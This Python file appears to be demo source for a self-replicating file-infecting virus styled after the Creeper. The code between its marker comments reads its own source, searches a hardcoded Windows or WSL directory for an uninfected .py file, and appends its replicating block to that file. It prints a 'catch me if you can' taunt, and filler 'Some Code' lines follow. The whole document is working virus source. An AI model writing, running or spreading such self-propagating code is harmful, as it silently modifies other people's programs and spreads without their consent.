# ========I'm the creeper:========
import os
import sys

with open(sys.argv[0], "r") as file:
    replicate = file.readlines()
    pos = [i for (i, line) in enumerate(replicate)
           if "I'm the creeper" in line or "Catch me if you can" in line]
    replicate = replicate[pos[0]:pos[-1] + 1]


def find(pattern, path):
    for root, dirs, files in os.walk(path):
        for name in list(filter(lambda f: pattern in f, files)):
            path = os.path.join(root, name)

            with open(path, "r") as file:
                copyFile = file.readlines()
                # print(copyFile)

                notInfected = not list(
                    filter(lambda line: "I'm the creeper" in line, copyFile))
                # notInfected = not [line for line in copyFile if ("I'm creeper" in line)]

                if notInfected:
                    return path, copyFile
    return None, None


if 'nt' in os.name:
    path, copyFile = find(".py", "D:\\Program\\Python3.7")        # Windows
else:
    path, copyFile = find(
        ".py", "/mnt/d/Program/Python3.7")  # For WSL
print("Path -- ", path)

if path:
    print("I'm the creeper, catch me if you can")
    copyFile.extend(replicate)
    with open(path, "w") as file:
        file.writelines(copyFile)

# ========Catch me if you can========

print("\nSome Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
print("Some Code")
